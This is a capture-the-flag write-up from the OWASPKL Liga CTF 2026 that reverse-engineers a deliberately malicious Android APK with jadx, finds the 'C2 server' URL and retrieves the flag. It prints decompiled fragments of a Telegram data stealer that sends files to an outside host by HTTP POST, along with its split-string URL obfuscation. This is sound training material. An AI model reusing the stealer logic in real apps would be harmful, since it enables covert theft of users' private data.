---
title: 'Liga CTF 2026: Find the C2 Server'
author: AmcaQt
categories: [OWASPKL- Liga CTF 2026]
tags: [reverse engineering, android, APK, jadx, C2, malware analysis]
render_with_liquid: false
media_subpath: /images/liga_ctf_c2_server/
date: 2026-05-24 00:00 +0000
---

![Find The C2 Server](malapk.png){: width="600" height="150" .shadow}

## Description

> This APK file is malicious. It secretly talks to a C2 Server. Identify the C2 Server address, and find the flag.

---

## Recon

An APK is just a ZIP file under the hood. We can load it straight into **jadx-gui** for full Java/Kotlin decompilation:

```bash
jadx-gui malapk.apk
```

Navigate to `com/example/protonx1337/MainActivity` in the source tree.

---

## Finding the Suspicious Method

Right in the `@Metadata` annotation and the `onCreate()` body, we spot something immediately:

![MainActivity jadx-gui showing backdoorC2 method call](malapk-clue-1.png)
_jadx-gui decompiled MainActivity — backdoorC2() called on startup_

Two things stand out:
- The `@Metadata` annotation leaks method names including **`"backdoorC2"`**
- `onCreate()` calls `backdoorC2()` directly — meaning it runs **on every app launch**

---

## Analyzing backdoorC2()

Clicking into `backdoorC2()` reveals the full malicious logic:

![backdoorC2 method body showing d1 + d2 URL construction](malapk-clue-2.png)
_backdoorC2() — C2 URL split across two variables to evade detection_

Key observations from the decompiled code:

```java
// targets Telegram local storage
File baseTelegramDir = new File(MainActivity.this.getExternalFilesDir(null), ...);
File targetFile = new File(baseTelegramDir, ...);

// C2 URL split into two parts — obfuscation technique!
String d1 = LiveLiterals$MainActivityKt.INSTANCE.m5425x506ff06();
String d2 = LiveLiterals$MainActivityKt.INSTANCE.m5426xcc12e607();
URLConnection = new URL(d1 + d2).openConnection();

// exfiltrates stolen data via HTTP POST
connection.setRequestMethod(...); // POST
os.write(telemetryPayload);
```

This malware:
1. Reads Telegram's local file storage
2. Sends stolen data to a C2 server via HTTP POST
3. Hides the C2 URL by splitting it across two separate method calls

---

## Tracing the C2 URL

The URL is stored in `LiveLiterals$MainActivityKt` static fields. The getter methods confirm:

```java
public final String m5425x506ff06() {
    if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
        return f98x506ff06;  // ← returns static field directly
    }
}

public final String m5426xcc12e607() {
    if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
        return f99xcc12e607;  // ← returns static field directly
    }
}
```

Navigating to the static field declarations in the same class:

```java
/* renamed from: String$val-d1... */
private static String f98x506ff06 = "https://appsecmy.com/";

/* renamed from: String$val-d2... */
private static String f99xcc12e607 = "pages/liga-ctf-2026";
```

**Full C2 URL:**
```
https://appsecmy.com/pages/liga-ctf-2026
```

---

## Getting the Flag

Visiting the C2 URL in a browser will lead to appsecmy website with details of this ctf, but `curl` reveals the flag hidden in the **HTML source comments**:

```bash
curl https://appsecmy.com/pages/liga-ctf-2026
```

The flag is buried inside `<!-- ... -->` HTML comment tags in the response body.

---

## Flag

`OWASPKL{https://chat.whatsapp.com/KAdpus4R0pb895ulC2jo8p}`

---

# Additional Info
## What This Malware Actually Does

This APK is a full Telegram data stealer:

```java
// Exfiltrated JSON payload structure:
{
    "device_id": "84a7b93f-1d4e-4f7b-952c-7b83aece9910",
    "os_version": "Android 14",
    "app_version": "1.0.0",
    "status": "active",
    "session_id": "s_9f82kdj48",
    "exfiltrated_data": "<telegram file contents>"
}
```

All of this gets POST'd to the C2 server silently on every app launch.

---

## Lesson Learned

- **APKs are ZIP files** — jadx-gui is all you need to decompile them
- **Split string obfuscation** (`d1 + d2`) is a common trick to hide C2 addresses from simple string grep
- Trace `LiveLiterals` classes in Kotlin apps — they hold the actual hardcoded values
- **`curl` beats a browser** when hunting for flags in HTML comments
- Method names in `@Metadata` annotations leak the entire class structure even before reading function bodies

---

## Happy Hacking

![](https://i.pinimg.com/originals/24/5d/82/245d82247faed3e636991bb8140d1981.gif)
